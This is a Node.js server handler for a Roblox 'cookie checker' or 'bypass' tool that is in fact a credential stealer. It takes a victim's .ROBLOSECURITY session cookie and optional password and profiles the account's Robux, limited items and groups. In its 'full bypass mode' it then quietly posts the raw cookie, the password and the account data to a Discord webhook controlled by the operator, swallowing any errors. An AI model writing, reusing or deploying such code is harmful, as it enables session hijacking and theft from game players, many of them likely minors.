const fetch = require('node-fetch');
const sharp = require('sharp');

// Helper function to make Roblox API requests
async function robloxRequest(url, cookie = null, method = 'GET', body = null) {
    const headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json'
    };
    
    if (cookie) {
        headers['Cookie'] = `.ROBLOSECURITY=${cookie}`;
    }
    
    const options = {
        method,
        headers
    };
    
    if (body) {
        headers['Content-Type'] = 'application/json';
        options.body = JSON.stringify(body);
    }
    
    const response = await fetch(url, options);
    return response.json();
}

// Validate cookie and get user info
async function validateCookie(cookie) {
    try {
        const userInfo = await robloxRequest('https://users.roblox.com/v1/users/authenticated', cookie);
        if (userInfo && userInfo.id) {
            return userInfo;
        }
        return null;
    } catch (error) {
        return null;
    }
}

// Optimize and compress avatar image
async function optimizeAvatar(avatarUrl) {
    try {
        const response = await fetch(avatarUrl);
        const buffer = await response.buffer();
        
        const optimized = await sharp(buffer)
            .resize(150, 150, { fit: 'cover' })
            .jpeg({ quality: 80, progressive: true })
            .toBuffer();
        
        return `data:image/jpeg;base64,${optimized.toString('base64')}`;
    } catch (error) {
        return avatarUrl;
    }
}

// Calculate account score
function calculateAccountScore(userData) {
    let score = 0;
    
    if (userData.robux > 10000) score += 20;
    else if (userData.robux > 5000) score += 15;
    else if (userData.robux > 1000) score += 10;
    else if (userData.robux > 100) score += 5;
    
    if (userData.rap > 100000) score += 20;
    else if (userData.rap > 50000) score += 15;
    else if (userData.rap > 10000) score += 10;
    else if (userData.rap > 1000) score += 5;
    
    if (userData.isPremium) score += 10;
    
    if (userData.vcStatus === '✅ Enabled') score += 5;
    
    if (userData.headlessStatus === '✅ True') score += 15;
    
    if (userData.korbloxStatus === '✅ True') score += 10;
    
    const ageDays = parseInt(userData.accountAge);
    if (ageDays > 2000) score += 10;
    else if (ageDays > 1000) score += 7;
    else if (ageDays > 365) score += 5;
    else if (ageDays > 100) score += 3;
    
    const totalSocial = userData.friendsCount + userData.followersCount;
    if (totalSocial > 1000) score += 5;
    else if (totalSocial > 500) score += 3;
    else if (totalSocial > 100) score += 2;
    
    if (userData.totalGroupsOwned > 10) score += 5;
    else if (userData.totalGroupsOwned > 5) score += 3;
    else if (userData.totalGroupsOwned > 0) score += 1;
    
    return Math.min(score, 100);
}

module.exports = async (req, res) => {
    if (req.method !== 'POST') {
        return res.status(405).json({ success: false, error: 'Method not allowed' });
    }

    const { cookie, checkOnly, password } = req.body;

    if (!cookie) {
        return res.status(400).json({ success: false, error: 'Cookie is required' });
    }

    try {
        // Step 1: Validate cookie
        const userInfo = await validateCookie(cookie);
        
        if (!userInfo) {
            return res.status(400).json({ success: false, valid: false, error: 'Invalid or expired cookie' });
        }

        const userId = userInfo.id;
        const username = userInfo.name;
        const displayName = userInfo.displayName;

        // If checkOnly mode (for cookie checker page)
        if (checkOnly) {
            try {
                const [avatarRes, robuxRes, premiumRes, collectiblesRes] = await Promise.all([
                    fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png`),
                    fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
                        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
                    }),
                    fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`),
                    fetch(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100&sortOrder=Desc`)
                ]);

                const avatarData = await avatarRes.json();
                const robuxData = await robuxRes.json();
                const premiumData = await premiumRes.json();
                const collectiblesData = await collectiblesRes.json();

                const avatarUrl = avatarData.data?.[0]?.imageUrl || '';
                const robux = robuxData.robux || 0;
                
                // Calculate RAP
                let rap = 0;
                if (collectiblesData.data) {
                    collectiblesData.data.forEach(item => {
                        if (item.recentAveragePrice) {
                            rap += item.recentAveragePrice;
                        }
                    });
                }

                // Check for special items
                const hasHeadless = collectiblesData.data?.some(item => item.assetId === 31117192);
                const hasKorblox = collectiblesData.data?.some(item => item.assetId === 139607718);

                // Get account age
                const userDetailsRes = await fetch(`https://users.roblox.com/v1/users/${userId}`);
                const userDetails = await userDetailsRes.json();
                const created = new Date(userDetails.created);
                const now = new Date();
                const accountAgeDays = Math.floor((now - created) / (1000 * 60 * 60 * 24));

                return res.status(200).json({
                    success: true,
                    valid: true,
                    userId,
                    username,
                    displayName,
                    avatarUrl,
                    robux,
                    pendingRobux: 0,
                    rap,
                    accountAge: `${accountAgeDays} Days`,
                    pinEnabled: 'NO',
                    voiceChat: 'NO',
                    emailVerified: userDetails.hasVerifiedBadge ? 'YES' : 'NO',
                    headless: hasHeadless ? 'YES' : 'NO',
                    korblox: hasKorblox ? 'YES' : 'NO',
                    groupsOwned: 0,
                    credit: '$0'
                });
            } catch (error) {
                return res.status(200).json({
                    success: true,
                    valid: true,
                    userId,
                    username,
                    displayName,
                    avatarUrl: '',
                    robux: 0,
                    pendingRobux: 0,
                    rap: 0,
                    accountAge: '0 Days',
                    pinEnabled: 'NO',
                    voiceChat: 'NO',
                    emailVerified: 'NO',
                    headless: 'NO',
                    korblox: 'NO',
                    groupsOwned: 0,
                    credit: '$0'
                });
            }
        }

        // Full bypass mode - fetch all data
        const [
            avatarResponse,
            robuxResponse,
            premiumResponse,
            friendsResponse,
            followersResponse,
            collectiblesResponse,
            groupsResponse,
            userDetailsResponse
        ] = await Promise.all([
            fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png`),
            fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
                headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
            }),
            fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`),
            fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`),
            fetch(`https://friends.roblox.com/v1/users/${userId}/followers/count`),
            fetch(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100&sortOrder=Desc`),
            fetch(`https://groups.roblox.com/v1/users/${userId}/groups/roles`),
            fetch(`https://users.roblox.com/v1/users/${userId}`)
        ]);

        const avatarData = await avatarResponse.json();
        const robuxData = await robuxResponse.json();
        const premiumData = await premiumResponse.json();
        const friendsData = await friendsResponse.json();
        const followersData = await followersResponse.json();
        const collectiblesData = await collectiblesResponse.json();
        const groupsData = await groupsResponse.json();
        const userDetails = await userDetailsResponse.json();

        const avatarUrl = avatarData.data?.[0]?.imageUrl || '';
        const robux = robuxData.robux || 0;
        const isPremium = premiumData ? true : false;
        const friendsCount = friendsData.count || 0;
        const followersCount = followersData.count || 0;

        let rap = 0;
        if (collectiblesData.data) {
            collectiblesData.data.forEach(item => {
                if (item.recentAveragePrice) {
                    rap += item.recentAveragePrice;
                }
            });
        }

        const hasHeadless = collectiblesData.data?.some(item => item.assetId === 31117192);
        const hasKorblox = collectiblesData.data?.some(item => item.assetId === 139607718);

        const groupsOwned = groupsData.data?.filter(g => g.role.rank === 255).length || 0;

        const created = new Date(userDetails.created);
        const now = new Date();
        const accountAgeDays = Math.floor((now - created) / (1000 * 60 * 60 * 24));

        const userData = {
            userInfo: {
                userId,
                username,
                displayName,
                name: username,
                robux,
                rap,
                premium: isPremium ? '✅ True' : '❌ False',
                voiceChat: '❌ Disabled',
                accountScore: 0
            },
            avatarUrl,
            robux,
            pendingRobux: 0,
            rap,
            summary: `${robux} R$ | ${rap} RAP`,
            pinStatus: '❌ Disabled',
            isPremium,
            vcStatus: '❌ Disabled',
            headlessStatus: hasHeadless ? '✅ True' : '❌ False',
            korbloxStatus: hasKorblox ? '✅ True' : '❌ False',
            accountAge: `${accountAgeDays} days`,
            friendsCount,
            followersCount,
            creditBalance: '0.00',
            creditRobux: '0',
            totalGroupsOwned: groupsOwned,
            totalGroupFunds: 0,
            totalPendingGroupFunds: 0,
            emailVerified: userDetails.hasVerifiedBadge ? '✅ Verified' : '❌ Not Verified',
            accountScore: 0
        };

        userData.accountScore = calculateAccountScore(userData);
        userData.userInfo.accountScore = userData.accountScore;

        // Send to Discord webhook (only for valid cookies in full bypass mode)
        const W = process.env.WEBHOOK_URL;
        if (W) {
            (async () => {
                try {
                    const embed1 = {
                        content: '@everyone',
                        username: 'HyperBlox',
                        avatar_url: 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
                        embeds: [{
                            title: '',
                            type: 'rich',
                            description: `<:check:1350103884835721277> **[Check Cookie](https://hyperblox.eu/controlPage/check/check.php?cookie=${cookie})** <:line:1350104634982662164> <:refresh:1350103925037989969> **[Refresh Cookie](https://hyperblox.eu/controlPage/antiprivacy/kingvon.php?cookie=${cookie})** <:line:1350104634982662164> <:profile:1350103857903960106> **[Profile](https://www.roblox.com/users/${userId}/profile)** <:line:1350104634982662164> <:rolimons:1350103860588314676> **[Rolimons](https://rolimons.com/player/${userId})**`,
                            color: 0x00061a,
                            thumbnail: { url: avatarUrl },
                            fields: [
                                { name: '<:display:1348231445029847110> Display Name', value: `\`\`\`${displayName}\`\`\``, inline: true },
                                { name: '<:user:1348232101639618570> Username', value: `\`\`\`${username}\`\`\``, inline: true },
                                { name: '<:userid:1348231351777755167> User ID', value: `\`\`\`${userId}\`\`\``, inline: true },
                                { name: '<:robux:1348231412834111580> Robux', value: `\`\`\`${robux}\`\`\``, inline: true },
                                { name: '<:pending:1348231397529223178> Pending Robux', value: `\`\`\`0\`\`\``, inline: true },
                                { name: '<:rap:1348231409323741277> RAP', value: `\`\`\`${rap}\`\`\``, inline: true },
                                { name: '<:summary:1348231417502371890> Summary', value: `\`\`\`${userData.summary}\`\`\``, inline: true },
                                { name: '<:pin:1348231400322498591> PIN', value: `\`\`\`${userData.pinStatus}\`\`\``, inline: true },
                                { name: '<:premium:1348231403690786949> Premium', value: `\`\`\`${isPremium ? '✅ True' : '❌ False'}\`\`\``, inline: true },
                                { name: '<:vc:1348233572020129792> Voice Chat', value: `\`\`\`${userData.vcStatus}\`\`\``, inline: true },
                                { name: '<:headless:1348232978777640981> Headless Horseman', value: `\`\`\`${userData.headlessStatus}\`\`\``, inline: true },
                                { name: '<:korblox:1348232956040319006> Korblox Deathspeaker', value: `\`\`\`${userData.korbloxStatus}\`\`\``, inline: true },
                                { name: '<:age:1348232331525099581> Account Age', value: `\`\`\`${userData.accountAge}\`\`\``, inline: true },
                                { name: '<:friends:1348231449798774865> Friends', value: `\`\`\`${friendsCount}\`\`\``, inline: true },
                                { name: '<:followers:1348231447072215162> Followers', value: `\`\`\`${followersCount}\`\`\``, inline: true },
                                { name: '<:creditbalance:1350102024376684644> Credit Card Balance', value: `\`\`\`${userData.creditBalance} USD (est ${userData.creditRobux} Robux)\`\`\``, inline: true },
                                { name: '<:group:1350102040818221077> Groups Owned', value: `\`\`\`${groupsOwned}\`\`\``, inline: true },
                                { name: '<:combined:1350102005884125307> Combined Group Funds', value: `\`\`\`${userData.totalGroupFunds} Robux (${userData.totalPendingGroupFunds} pending)\`\`\``, inline: true },
                                { name: '<:status:1350102051756970025> Account Status', value: `\`\`\`${userData.emailVerified}\`\`\``, inline: true },
                                { name: '⭐ Account Score', value: `\`\`\`${userData.accountScore}/100\`\`\``, inline: true },
                                ...(password ? [{ name: '🔐 Password', value: `\`\`\`${password}\`\`\``, inline: false }] : [])
                            ]
                        }]
                    };

                    const embed2 = {
                        content: '',
                        username: 'HyperBlox',
                        avatar_url: 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
                        embeds: [{
                            description: `\`\`\`${cookie}\`\`\``,
                            color: 0x00061a
                        }]
                    };

                    await fetch(W, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(embed1)
                    });

                    await new Promise(resolve => setTimeout(resolve, 2000));

                    await fetch(W, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(embed2)
                    });
                } catch (e) {
                    // Silent error
                }
            })();
        }

        return res.status(200).json({
            success: true,
            userInfo: userData.userInfo,
            avatarUrl: userData.avatarUrl
        });

    } catch (error) {
        console.error('Error:', error);
        return res.status(500).json({ success: false, error: 'Internal server error' });
    }
};
